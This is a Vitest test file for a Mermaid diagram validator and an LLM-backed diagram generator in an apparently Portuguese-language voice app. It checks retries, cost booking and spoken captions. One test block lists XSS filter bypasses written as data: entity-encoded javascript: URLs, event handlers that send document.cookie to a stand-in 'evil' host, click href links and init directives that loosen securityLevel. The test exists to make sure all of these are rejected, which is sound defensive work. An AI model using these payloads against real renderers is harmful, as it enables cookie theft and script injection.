import { describe, it, expect, afterAll, vi } from "vitest";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { randomUUID } from "node:crypto";
import type { MermaidCompletion, MermaidOptions } from "../services/mermaid.js";

// The generator books cost, which reaches storage, which imports sandbox.ts —
// and that freezes homedir()-derived roots at module load. HOME first, import
// after, same as storage.test.ts.
const tmpHome = mkdtempSync(join(tmpdir(), "explainer-mermaid-"));
process.env.HOME = tmpHome;

const mermaid = await import("../services/mermaid.js");
const costs = await import("../services/costs.js");

afterAll(() => {
  rmSync(tmpHome, { recursive: true, force: true });
});

const VALID: Record<string, string> = {
  flowchart: `flowchart TD
    A["Navegador"] --> B["Backend"]
    B --> C["Modelo de voz"]`,
  sequenceDiagram: `sequenceDiagram
    participant N as Navegador
    participant B as Backend
    N->>B: chamada de ferramenta
    B-->>N: resultado`,
  classDiagram: `classDiagram
    class Conversa {
        +String id
        +iniciar()
    }
    Conversa --> Material`,
  "stateDiagram-v2": `stateDiagram-v2
    [*] --> Ocioso
    Ocioso --> Ouvindo
    Ouvindo --> [*]`,
  erDiagram: `erDiagram
    CONVERSA ||--o{ MENSAGEM : contem
    CONVERSA {
        string id
        string titulo
    }`,
  journey: `journey
    title Jornada do usuario
    section Comeco
      Abrir o app: 5: Usuario`,
  gantt: `gantt
    title Cronograma
    dateFormat YYYY-MM-DD
    section Onda 1
    Gerador de mermaid :a1, 2026-08-08, 3d`,
  pie: `pie title Distribuicao
    "Backend" : 60
    "Navegador" : 40`,
  mindmap: `mindmap
  root((Explainer))
    Backend
      Ferramentas
    Navegador`,
  timeline: `timeline
    title Historia do projeto
    2026 : Primeira versao
    2027 : Realtime`,
};

const SIMPLE = VALID.flowchart!;

function reply(text: string): MermaidCompletion {
  return { text };
}

/** A stub that answers each attempt in turn, and records the prompts it saw. */
function scripted(answers: string[]): MermaidOptions & { prompts: string[] } {
  const prompts: string[] = [];
  let index = 0;
  return {
    prompts,
    complete: async (prompt: string) => {
      prompts.push(prompt);
      const answer = answers[Math.min(index, answers.length - 1)] ?? "";
      index += 1;
      return reply(answer);
    },
  };
}

describe("validateMermaid", () => {
  for (const [kind, source] of Object.entries(VALID)) {
    it(`accepts a valid ${kind}`, () => {
      const result = mermaid.validateMermaid(source);
      expect(result.problems).toEqual([]);
      expect(result.ok).toBe(true);
      expect(result.kind).toBe(kind);
    });
  }

  it("rejects an empty string", () => {
    const result = mermaid.validateMermaid("");
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/vazio/);
  });

  it("rejects code fences", () => {
    const fenced = "```mermaid\nflowchart TD\n    A --> B\n```";
    const result = mermaid.validateMermaid(fenced);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/cercas de codigo/);
  });

  it("rejects prose before the diagram", () => {
    const result = mermaid.validateMermaid(
      `Claro! Aqui esta o diagrama que voce pediu:\n${SIMPLE}`,
    );
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/primeira linha util/);
  });

  it("rejects an invented diagram type", () => {
    for (const invented of ["graphviz", "flowchartt"]) {
      const result = mermaid.validateMermaid(`${invented} TD\n    A --> B`);
      expect(result.ok).toBe(false);
      expect(result.kind).toBeUndefined();
      expect(result.problems.join(" ")).toMatch(/primeira linha util/);
    }
  });

  it("names the fix for the two near-misses mermaid does accept", () => {
    expect(mermaid.validateMermaid("graph TD\n    A --> B").problems.join(" ")).toMatch(
      /"graph" por "flowchart"/,
    );
    expect(
      mermaid.validateMermaid("stateDiagram\n    [*] --> A").problems.join(" "),
    ).toMatch(/"stateDiagram-v2"/);
  });

  it("rejects unbalanced brackets", () => {
    const result = mermaid.validateMermaid(`flowchart TD
    A[Navegador --> B[Backend]`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/Faltou fechar/);
  });

  it("reports a closer that was never opened", () => {
    const result = mermaid.validateMermaid(`flowchart TD
    A --> B]`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/nunca foi aberto/);
  });

  it("rejects unbalanced quotes", () => {
    const result = mermaid.validateMermaid(`flowchart TD
    A["Navegador] --> B["Backend"]`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/aspa dupla/);
  });

  it("rejects a script tag", () => {
    const result = mermaid.validateMermaid(`flowchart TD
    A["<script>alert(1)</script>"] --> B["fim"]`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/tag HTML/);
  });

  it("rejects a javascript: URL", () => {
    const result = mermaid.validateMermaid(`flowchart TD
    A["ok"] --> B["javascript:alert(1)"]`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/javascript:/);
  });

  it("rejects an href attribute", () => {
    const result = mermaid.validateMermaid(`flowchart TD
    A["<a href='x'>oi</a>"] --> B["fim"]`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/href/);
  });

  it("rejects an onerror attribute", () => {
    const result = mermaid.validateMermaid(`flowchart TD
    A["<img src=x onerror=alert(1)>"] --> B["fim"]`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/atributo de evento/);
  });

  it("rejects a click ... call directive", () => {
    const result = mermaid.validateMermaid(`flowchart TD
    A["ok"] --> B["fim"]
    click A call foo()`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/click/);
  });

  it("rejects an init directive that touches securityLevel", () => {
    const result = mermaid.validateMermaid(
      `%%{init: {"securityLevel":"loose"}}%%\n${SIMPLE}`,
    );
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/securityLevel/);
  });

  it("rejects an init directive that touches htmlLabels", () => {
    const result = mermaid.validateMermaid(
      `%%{init: {"flowchart":{"htmlLabels":"false"}}}%%\n${SIMPLE}`,
    );
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/htmlLabels/);
  });

  it("keeps an ordinary comment line", () => {
    const result = mermaid.validateMermaid(`%% desenho da chamada de ferramenta\n${SIMPLE}`);
    expect(result.ok).toBe(true);
    expect(result.kind).toBe("flowchart");
  });

  it("rejects a diagram with too many lines", () => {
    const huge = ["flowchart TD", ...Array.from({ length: 300 }, (_, i) => `    A${i} --> B${i}`)].join("\n");
    const result = mermaid.validateMermaid(huge);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/linhas e o limite/);
  });

  it("rejects a diagram with too many characters", () => {
    const result = mermaid.validateMermaid(`flowchart TD\n    A["${"x".repeat(9_000)}"]`);
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/caracteres e o limite/);
  });
});

describe("stripFences", () => {
  it("removes the fence lines and leaves the diagram", () => {
    const cleaned = mermaid.stripFences("```mermaid\nflowchart TD\n    A --> B\n```");
    expect(cleaned).toBe("flowchart TD\n    A --> B");
  });
});

describe("generateMermaid", () => {
  const request = {
    instructions: "desenha o fluxo de uma chamada de ferramenta, do navegador ao backend",
  };

  it("returns a validated diagram with a spoken caption, an id and a timestamp", async () => {
    const stub = scripted([`LEGENDA: Esse desenho mostra a ida e a volta de uma chamada de ferramenta.\nDIAGRAMA:\n${SIMPLE}`]);
    const diagram = await mermaid.generateMermaid(
      { ...request, title: "Chamada de ferramenta" },
      randomUUID(),
      stub,
    );

    expect(diagram.kind).toBe("flowchart");
    expect(diagram.source).toBe(SIMPLE);
    expect(diagram.title).toBe("Chamada de ferramenta");
    expect(diagram.caption).toBe(
      "Esse desenho mostra a ida e a volta de uma chamada de ferramenta.",
    );
    expect(diagram.id).toMatch(/^[0-9a-f-]{36}$/);
    expect(Number.isNaN(Date.parse(diagram.created_at))).toBe(false);
    expect(stub.prompts).toHaveLength(1);
  });

  it("cleans fences and a prefaced sentence without spending a retry", async () => {
    const stub = scripted([
      `Claro, segue o diagrama.\nLEGENDA: Mostra o caminho da chamada.\nDIAGRAMA:\n\`\`\`mermaid\n${SIMPLE}\n\`\`\``,
    ]);
    const diagram = await mermaid.generateMermaid(request, randomUUID(), stub);

    expect(diagram.source).toBe(SIMPLE);
    expect(stub.prompts).toHaveLength(1);
  });

  it("falls back to a spoken caption when the model omits one", async () => {
    const stub = scripted([SIMPLE]);
    const diagram = await mermaid.generateMermaid(request, randomUUID(), stub);

    expect(diagram.caption).toMatch(/fluxograma/);
    expect(diagram.caption).not.toMatch(/[`*_#]/);
  });

  it("retries with the problems and succeeds on the third attempt", async () => {
    const stub = scripted([
      "Aqui esta o diagrama:\nflowchartt TD\n    A --> B",
      `LEGENDA: quase\nDIAGRAMA:\nflowchart TD\n    A[Navegador --> B[Backend]`,
      `LEGENDA: Do navegador ao backend e de volta.\nDIAGRAMA:\n${SIMPLE}`,
    ]);

    const diagram = await mermaid.generateMermaid(request, randomUUID(), stub);

    expect(diagram.source).toBe(SIMPLE);
    expect(stub.prompts).toHaveLength(3);
    // Each correction carries the previous failure back to the model.
    expect(stub.prompts[1]).toMatch(/primeira linha util/);
    expect(stub.prompts[2]).toMatch(/Faltou fechar/);
    expect(stub.prompts[2]).toMatch(/Diagrama recusado/);
  });

  it("gives up after three attempts with a message the voice model can read", async () => {
    const stub = scripted(["nao sei desenhar isso, desculpa"]);

    await expect(mermaid.generateMermaid(request, randomUUID(), stub)).rejects.toThrow(
      /Tentei 3 vezes/,
    );
    expect(stub.prompts).toHaveLength(3);

    const failure = await mermaid
      .generateMermaid(request, randomUUID(), scripted(["nao sei desenhar isso"]))
      .catch((err: unknown) => err);

    expect(failure).toBeInstanceOf(mermaid.MermaidError);
    expect((failure as InstanceType<typeof mermaid.MermaidError>).problems.length).toBeGreaterThan(0);
  });

  it("refuses empty instructions without calling the model", async () => {
    const stub = scripted([SIMPLE]);
    await expect(
      mermaid.generateMermaid({ instructions: "   " }, randomUUID(), stub),
    ).rejects.toBeInstanceOf(mermaid.MermaidError);
    expect(stub.prompts).toHaveLength(0);
  });

  it("books one ledger entry per attempt, including the failed ones", async () => {
    const conversationId = randomUUID();
    let attempt = 0;
    const answers = ["flowchartt TD\n    A --> B", SIMPLE];

    await mermaid.generateMermaid(request, conversationId, {
      complete: async () => {
        const text = answers[Math.min(attempt, answers.length - 1)]!;
        attempt += 1;
        return {
          text,
          usage: { input_tokens: 1_000, output_tokens: 200 },
          model: "gpt-5.2-mini",
        };
      },
    });

    const summary = await costs.getCosts(conversationId);
    expect(summary.entries).toHaveLength(2);
    expect(summary.entries.every((entry) => entry.source === "text")).toBe(true);
    // 1000 input @ 0.35/1M + 200 output @ 2.8/1M, twice.
    expect(summary.by_source.text).toBeCloseTo(0.00091 * 2, 8);
    expect(summary.entries[0]?.detail).toMatch(/mermaid/);
  });

  // Expectation changed after the adversarial review: booking nothing is still
  // the contract for an injected client, but the review's point stands — a
  // silent zero is this ledger's documented failure mode, so the call now says
  // out loud that it was not charged instead of leaving the panel to imply free.
  it("books nothing but warns when the caller's client reports no usage", async () => {
    const conversationId = randomUUID();
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});

    await mermaid.generateMermaid(request, conversationId, scripted([SIMPLE]));

    const summary = await costs.getCosts(conversationId);
    expect(summary.entries).toEqual([]);
    expect(warn).toHaveBeenCalledTimes(1);
    expect(warn.mock.calls[0]?.[0]).toMatch(/not billed/);
    warn.mockRestore();
  });

  it("warns when the model id is not on the rate card, without failing", async () => {
    const conversationId = randomUUID();
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});

    const diagram = await mermaid.generateMermaid(request, conversationId, {
      complete: async () => ({
        text: SIMPLE,
        usage: { input_tokens: 1_000, output_tokens: 200 },
        model: "gpt-5.3-mini",
      }),
    });

    expect(diagram.kind).toBe("flowchart");
    expect(warn).toHaveBeenCalledTimes(1);
    expect(warn.mock.calls[0]?.[0]).toMatch(/gpt-5\.3-mini.*rate card/);
    // The entry is still written, at the only price the rate card can name.
    const summary = await costs.getCosts(conversationId);
    expect(summary.entries).toHaveLength(1);
    expect(summary.by_source.text).toBe(0);
    warn.mockRestore();
  });
});

// A false rejection is not a harmless strictness: it burns a retry the user pays
// for and can fail an otherwise good diagram three times. These are the shapes
// whose syntax is legitimately "unbalanced" and would break a naive scan.
describe("validateMermaid does not reject legitimate syntax", () => {
  const realistic: Record<string, string> = {
    // The four the adversarial review measured as false rejections, plus the
    // three the fix for them had to keep working.
    "sequence with the async message arrows -) and --)": `sequenceDiagram
    participant N as Navegador
    participant B as Backend
    N-)B: mensagem assincrona
    B--)N: resposta assincrona
    N->>B: chamada normal`,
    "yaml frontmatter before the type": `---
title: Fluxo da chamada de ferramenta
---
flowchart TD
    A["Navegador"] --> B["Backend"]`,
    "the asymmetric flowchart node A>\"texto\"]": `flowchart TD
    A>"Aviso"] --> B["Fim"]`,
    "a label that merely names securityLevel": `flowchart TD
    A["securityLevel strict"] --> B["htmlLabels desligado"]`,
    "a mindmap node whose text starts with click": `mindmap
  root((Interface))
    click do usuario
    resposta falada`,
    "a gantt task whose text starts with click": `gantt
    title Cronograma
    dateFormat YYYY-MM-DD
    section Uso
    click do usuario :a1, 2026-08-08, 3d`,
    "statements separated by semicolons": `flowchart TD;
    A["Inicio"] --> B["Fim"];
    B --> C["Depois"];`,
    "flowchart with subgraphs and edge labels": `flowchart LR
    subgraph Navegador
      U["Usuario fala"] --> S["Sessao WebRTC"]
    end
    subgraph Servidor
      T["Executor de ferramentas"] --> R[("Repositorio")]
    end
    S -->|chamada de ferramenta| T
    T -->|resultado| S`,
    "sequence with alt, else and a note": `sequenceDiagram
    autonumber
    participant N as Navegador
    participant B as Backend
    N->>B: POST /api/tool
    alt material existe
        B-->>N: trecho do arquivo
    else nao existe
        B-->>N: aviso
    end
    Note over N,B: tudo passa pelo sandbox`,
    "er cardinality symbols that invert braces": `erDiagram
    CONVERSA ||--o{ MENSAGEM : contem
    CONVERSA }o--|| USUARIO : pertence
    MATERIAL }|..|{ CONVERSA : usado`,
    "class diagram with a stereotype and a method": `classDiagram
    class Ferramenta {
        <<interface>>
        +String nome
        +executar(args) String
    }
    Ferramenta <|-- LeitorDeArquivo`,
    "composite state": `stateDiagram-v2
    [*] --> Ocioso
    state Chamada {
        Ouvindo --> Pensando
        Pensando --> Falando
    }
    Ocioso --> Chamada
    Chamada --> [*]`,
    "mindmap cloud and bang shapes": `mindmap
  root((Explainer))
    Backend
      )Ferramentas(
      ((Custos))
    Navegador`,
    "a percent sign inside a label": `flowchart TD
    A["Cobertura de 50% dos casos"] --> B["Fim"]`,
  };

  for (const [name, source] of Object.entries(realistic)) {
    it(`accepts ${name}`, () => {
      const result = mermaid.validateMermaid(source);
      expect(result.problems).toEqual([]);
      expect(result.ok).toBe(true);
    });
  }

  it("accepts every legitimate diagram in the corpus, all 23 of them", () => {
    const corpus = { ...VALID, ...realistic };
    const rejected = Object.entries(corpus)
      .filter(([, source]) => !mermaid.validateMermaid(source).ok)
      .map(([name]) => name);

    expect(Object.keys(corpus).length).toBeGreaterThanOrEqual(23);
    expect(rejected).toEqual([]);
  });
});

// The first version of these checks was a denylist of literal spellings, and an
// adversarial review ran 51 hostile diagrams through it: 27 came back ok: true.
// These are the eight chains it verified by hand, plus every variant it listed.
// Each one reaches the renderer as the construct the denylist was looking for —
// it just is not spelled that way in the source. Nothing here may ever be ok.
describe("validateMermaid rejects the bypasses the adversarial review found", () => {
  const attacks: Record<string, string> = {
    'A: classDiagram "link" with an entity-escaped javascript URL': `classDiagram
class Conversa
link Conversa "&#106;avascript:fetch('//evil/'+document.cookie)" "abrir"`,
    "B: classDiagram callback, the interaction directive nobody checked": `classDiagram
class Conversa
callback Conversa "roubaTudo" "dica"`,
    "C: click call hidden behind a semicolon on the same line": `flowchart TD
A["Inicio"] --> B["Fim"]; click B call roubaTudo()`,
    "D: click href, which never carries the = the old check demanded": `flowchart TD
A["Inicio"] --> B["Fim"]; click B href "https://evil.example" _blank`,
    "E: an img tag with onpointerover, neither of them on the old lists": `flowchart TD
A["<img src=x onpointerover=fetch('//evil/'+document.cookie)>"] --> B`,
    "E2: onauxclick": `flowchart TD
A["<b onauxclick=alert(1)>oi</b>"] --> B`,
    "E3: onanimationend": `flowchart TD
A["<b onanimationend=alert(1)>oi</b>"] --> B`,
    "E4: a video tag with onplay": `flowchart TD
A["<video src=x onplay=alert(1)>"] --> B`,
    "E5: an anchor with target=_blank": `flowchart TD
A["<a target=_blank>oi</a>"] --> B`,
    "F1: a script tag written as HTML entities": `flowchart TD
A["&lt;script&gt;alert(1)&lt;/script&gt;"] --> B`,
    "F2: a script tag written in mermaid's own #NNN; escapes": `flowchart TD
A["#60;script#62;alert(1)#60;/script#62;"] --> B`,
    "F3: an img/onerror rebuilt from #60; and #111;": `flowchart TD
A["#60;img src=x #111;nerror=alert(1)#62;"] --> B`,
    "G1: javascript: split across a line break inside the label": `flowchart TD
A["java
script:alert(1)"] --> B`,
    "G2: javascript: with an entity-escaped first letter": `flowchart TD
A["&#106;avascript:alert(1)"] --> B`,
    "G3: the same, double-encoded as &amp;#106;": `flowchart TD
A["&amp;#106;avascript:alert(1)"] --> B`,
    "H1: an init directive turning htmlLabels back on": `%%{init: {"flowchart":{"htmlLabels":true}}}%%
flowchart TD
A["oi"] --> B["fim"]`,
    "H2: the same key spelled security_level": `%%{init: {"security_level":"loose"}}%%
flowchart TD
A["oi"] --> B["fim"]`,
    "H3: htmlLabels behind a \\u escape, which the directive parser JSON-decodes": `%%{init: {"flowchart":{"\\u0068tmlLabels":true}}}%%
flowchart TD
A["oi"] --> B["fim"]`,
  };

  for (const [name, source] of Object.entries(attacks)) {
    it(`rejects ${name}`, () => {
      const result = mermaid.validateMermaid(source);
      expect(result.ok).toBe(false);
      expect(result.problems.length).toBeGreaterThan(0);
    });
  }
});

// The caption is the one string in this module that is spoken to the user, and
// it was the one string never validated: "O no A[Navegador] aponta para
// B[Backend] com a seta -->" went to text-to-speech as written.
describe("the caption is never mermaid syntax read out loud", () => {
  const request = { instructions: "desenha o fluxo de uma chamada de ferramenta" };

  const syntactic: Record<string, string> = {
    "node ids and an arrow": "O no A[Navegador] aponta para B[Backend] com a seta -->.",
    "an async arrow": "O ator A manda -) para B.",
    "a directive": "Veja %%{init: {\"theme\":\"dark\"}}%% no topo.",
    "node parentheses": "O no raiz((Explainer)) abre o mapa.",
    "the diagram itself": "flowchart TD A --> B",
  };

  for (const [name, caption] of Object.entries(syntactic)) {
    it(`falls back to the spoken caption when the model writes ${name}`, async () => {
      const stub = scripted([`LEGENDA: ${caption}\nDIAGRAMA:\n${SIMPLE}`]);
      const diagram = await mermaid.generateMermaid(request, randomUUID(), stub);

      expect(diagram.caption).toMatch(/fluxograma/);
      expect(diagram.caption).not.toMatch(/[[\]{}|<>`]/);
      expect(diagram.caption).not.toMatch(/--?>|-{1,2}\)|%%/);
    });
  }

  it("keeps a caption that is an ordinary spoken sentence", async () => {
    const stub = scripted([
      `LEGENDA: O navegador chama o backend e recebe a resposta de volta.\nDIAGRAMA:\n${SIMPLE}`,
    ]);
    const diagram = await mermaid.generateMermaid(request, randomUUID(), stub);

    expect(diagram.caption).toBe(
      "O navegador chama o backend e recebe a resposta de volta.",
    );
  });
});
